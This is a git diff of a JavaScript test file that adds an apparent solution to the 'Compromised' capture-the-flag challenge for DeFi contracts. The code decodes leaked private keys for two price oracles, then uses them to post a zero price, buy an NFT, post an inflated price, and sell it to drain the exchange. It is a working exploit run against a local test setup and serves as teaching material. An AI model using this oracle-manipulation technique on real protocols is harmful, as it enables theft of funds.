@@ -16,6 +16,7 @@ describe('Compromised challenge', function () {
     const INITIAL_NFT_PRICE = 999n * 10n ** 18n;
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
     const TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2n * 10n ** 18n;
+    const DVNNFT_STR = 'DVNFT';
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -36,7 +37,7 @@ describe('Compromised challenge', function () {
         oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
             await (await TrustfulOracleInitializerFactory.deploy(
                 sources,
-                ['DVNFT', 'DVNFT', 'DVNFT'],
+                [DVNNFT_STR, DVNNFT_STR, DVNNFT_STR],
                 [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
             )).oracle()
         );
@@ -53,6 +54,55 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const leakedRawData = [
+            '4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535',
+            '4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134'
+        ];
+
+        // Base64 (https://en.wikipedia.org/wiki/Base64) commonly used online to encode binary
+        // data as a string. Two (hex) numbers are used to represent one byte hence spacing
+        // in the leaked data which I've removed. To get the private keys:
+        //
+        // 1) interpret the raw data as hex & convert to string
+        // 2) interpret the first decoded string as base64 & convert to string
+
+        function convertRawToPrivateKey(raw) {
+            const decodedHexStr = Buffer.from(raw, 'hex').toString('utf8');
+            const decodedB64Str = Buffer.from(decodedHexStr, 'base64').toString('utf8');
+
+            return decodedB64Str;
+        };
+
+        const privateKey0 = convertRawToPrivateKey(leakedRawData[0]);
+        const privateKey1 = convertRawToPrivateKey(leakedRawData[1]);
+
+        // get two new signers from ethersjs for these keys
+        const signer0 = new ethers.Wallet(privateKey0, ethers.provider);
+        const signer1 = new ethers.Wallet(privateKey1, ethers.provider);
+
+        // @audit Exchange depends upon oracle prices, we must compromise
+        // the oracle prices to buy nft low & sell high. Attack:
+        //
+        // 1) Call TrustfulOracle.postPrice() from compromised oracles
+        // to set zero price
+        //
+        // 2) Buy NFT via Exchange.buyOne()
+        //
+        // 3) Call TrustfulOracle.postPrice() with EXCHANGE_INITIAL_ETH_BALANCE
+        // to set price at exchange funds
+        //
+        // 4) Sell NFT via Exchange.sellOne() to drain exchange
+        await oracle.connect(signer0).postPrice(DVNNFT_STR, 0);
+        await oracle.connect(signer1).postPrice(DVNNFT_STR, 0);
+
+        await exchange.connect(player).buyOne({value: ethers.utils.parseEther("0.000000001")});
+
+        await oracle.connect(signer0).postPrice(DVNNFT_STR, EXCHANGE_INITIAL_ETH_BALANCE);
+        await oracle.connect(signer1).postPrice(DVNNFT_STR, EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // need to approve exchange to sell our NFT
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
     });
 
     after(async function () {
@@ -75,7 +125,7 @@ describe('Compromised challenge', function () {
 
         // NFT price shouldn't have changed
         expect(
-            await oracle.getMedianPrice('DVNFT')
+            await oracle.getMedianPrice(DVNNFT_STR)
         ).to.eq(INITIAL_NFT_PRICE);
     });
 });
